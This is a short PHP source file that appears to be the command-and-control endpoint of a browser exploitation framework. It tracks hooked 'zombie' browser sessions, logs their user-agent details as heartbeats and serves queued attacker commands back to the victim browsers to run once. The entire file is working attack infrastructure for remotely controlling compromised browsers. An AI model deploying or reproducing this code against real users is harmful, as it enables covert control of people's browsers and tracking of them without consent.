<?php


	require_once("../include/globals.inc.php");
	require_once("../include/hook.inc.php");
	require_once("../include/common.inc.php");

 	session_name(SESSION_NAME);
	session_start();

	$zombie_hook_dir = ZOMBIE_TMP_DIR . session_id();

	// create a directory for this zombie if it doens't exist
	if(!file_exists($zombie_hook_dir)) {
		mkdir($zombie_hook_dir);
	}

	// heartbeat - write the heartbeat details to file
	$zombie_hook_heartbeat_file = $zombie_hook_dir . "/" . HEARTBEAT_FILENAME;
	file_put_contents($zombie_hook_heartbeat_file, get_ua_details());

	// if no command return empty file
	$zombie_hook_cmd_file = $zombie_hook_dir . "/" . CMD_FILENAME; //cache/zombie/session/cmd
	if(!file_exists($zombie_hook_cmd_file)) { return ""; }

	// get the command from $zombie_hook_cmd_file
	$code = module_code_and_result_setup($zombie_hook_cmd_file);
	// to ensure the code is exec only one delete the file
	unlink($zombie_hook_cmd_file);//删除一个文件的目录项并减少它的链接数，若成功则返回0，否则返回-1

	echo $code;

?>
